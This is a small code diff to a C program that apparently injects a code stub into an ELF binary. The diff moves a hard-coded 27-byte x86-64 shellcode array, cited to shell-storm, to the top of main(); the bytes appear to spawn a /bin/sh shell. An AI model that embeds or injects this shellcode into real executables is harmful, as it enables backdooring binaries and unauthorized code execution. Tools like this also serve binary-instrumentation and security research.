@@ -314,6 +314,10 @@ int main (int argc, char **argv)
 	uint64_t p_offset;
 	bool res;
 
+	// http://shell-storm.org/shellcode/files/shellcode-806.php
+	uint8_t stub[27] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48" \
+		         "\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+	
 	if (argc != 3) {
 		printf("Usage: %s <host> <output binary>\n", argv[0]);
 		exit(EXIT_SUCCESS);
@@ -346,9 +350,6 @@ int main (int argc, char **argv)
 	 * Otherwise stubs can be also operated as byte-arrays.
 	 */
 
-	// http://shell-storm.org/shellcode/files/shellcode-806.php
-	uint8_t stub[27] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48" \
-		         "\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 	if (elf_init_stub(&obj2, stub, sizeof(stub), &error) == false) {
 		fprintf(stderr, "%s\n", elf_error_msg(&error));
 		return -1;
